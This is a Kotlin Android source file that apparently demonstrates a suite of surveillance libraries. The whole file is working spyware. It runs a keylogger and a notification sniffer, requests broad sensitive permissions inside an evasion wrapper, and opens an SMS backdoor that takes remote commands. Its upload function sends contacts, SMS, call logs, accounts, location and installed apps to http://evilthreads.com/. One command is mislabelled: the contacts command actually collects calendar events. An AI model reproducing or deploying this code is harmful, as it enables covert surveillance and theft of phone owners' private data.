package com.evilthreads.evademe

import android.Manifest
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.evilthreads.drawersnifferlib.DrawerSniffer
import com.evilthreads.evade.evade
import com.evilthreads.keylogger.Keylogger
import com.evilthreads.pickpocket.*
import com.evilthreads.pickpocket.podos.*
import com.evilthreads.smsbackdoor.SmsBackdoor
import com.kotlinpermissions.KotlinPermissions
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.features.auth.*
import io.ktor.client.features.auth.providers.*
import io.ktor.client.features.json.*
import io.ktor.client.features.json.serializer.*
import io.ktor.client.request.*
import io.ktor.http.*
import io.ktor.util.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext

/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
class MainActivity : AppCompatActivity() {
    val TAG = this.javaClass.simpleName

    @KtorExperimentalAPI
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val payload = suspend {
            withContext(Dispatchers.Default) {
                val keyloggerJob = launch {
                    Keylogger.subscribe { entry ->
                        Log.d("KEYLOGGER", entry.toString())
                    }
                }
                launch {
                    DrawerSniffer.subscribe(this@MainActivity) { notification ->
                        Log.d("DRAWERSNIFFER", notification.toString())
                    }
                }.join()
                keyloggerJob.join()
            }
        }
        evade {
            val kotlinPermissions = KotlinPermissions.with(this).apply {
                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.READ_PHONE_STATE)
                else
                    permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION)
            }
            kotlinPermissions.onAccepted {
                HttpClient(CIO){
                    install(JsonFeature){
                        serializer = KotlinxSerializer()
                    }
                    install(Auth){
                        basic {
                            username = "evilthreads"
                            password = "secret"
                        }
                    }
                }.use { client ->
                    SmsBackdoor.openDoor(this, "666:", payload = payload) { remoteCommand ->
                        runBlocking {
                            when (remoteCommand) {
                                "COMMAND_GET_CONTACTS" -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
                                "COMMAND_GET_CALL_LOG" -> callLogLaunch(this@MainActivity).let { calls -> client.upload(calls) }
                                "COMMAND_GET_SMS" -> smsLaunch(this@MainActivity).let { smsMessages -> client.upload(smsMessages) }
                                "COMMAND_GET_ACCOUNTS" -> accountsLaunch(this@MainActivity).let { accounts -> client.upload(accounts) }
                                "COMMAND_GET_MMS" -> mmsLaunch(this@MainActivity).let { mmsMessages -> Log.d("PICKPOCKET", "NEEDS MULTIPART") }
                                "COMMAND_GET_FILES" -> filesLaunch(this@MainActivity).let { files -> Log.d("PICKPOCKET", "NEEDS MULTIPART") }
                                "COMMAND_GET_DEVICE_INFO" -> deviceLaunch(this@MainActivity).let { device -> client.upload(listOf(device)) }
                                "COMMAND_GET_LOCATION" -> locationLaunch(this@MainActivity)?.let { location -> client.upload(listOf(location)) }
                                "COMMAND_GET_SETTINGS" -> settingsLaunch(this@MainActivity).let { settings -> client.upload(settings) }
                                "COMMAND_GET_INSTALLED_APPS" -> softwareLaunch(this@MainActivity).let { apps -> client.upload(apps) }
                                else -> Log.d(TAG, "COMMAND NOT FOUND")
                            }
                        }
                    }
                }
                Keylogger.requestPermission(this)
                if (!DrawerSniffer.hasPermission(this))
                    DrawerSniffer.requestPermission(this)
            }.ask()
        }
    }
}

val url = "http://evilthreads.com/"
val contactsUri = url.plus("contacts")
val smsUri = url.plus("sms")
val callLogUri = url.plus("calls")
val accountsUri = url.plus("accounts")
val mmsUri = url.plus("mms")
val filesUri = url.plus("files")
val deviceUri = url.plus("device")
val locationUri = url.plus("location")
val settingsUri = url.plus("settings")
val softwareUri = url.plus("software")

inline suspend fun <reified T: PocketData> HttpClient.upload(data: List<T>){
    lateinit var uri: String
    when(data.first()){
        is Contact -> uri = contactsUri
        is CallLogEntry -> uri = callLogUri
        is Sms -> uri = smsUri
        is UserAccount -> uri = accountsUri
        is Mms -> uri = mmsUri
        is DocumentsFile -> uri = filesUri
        is Device -> uri = deviceUri
        is RecentLocation -> uri = locationUri
        is Setting -> uri = settingsUri
        is Software -> uri = softwareUri
    }
    this.post<List<T>>(uri){
        body = defaultSerializer().write(data, ContentType.Application.Json)
    }
}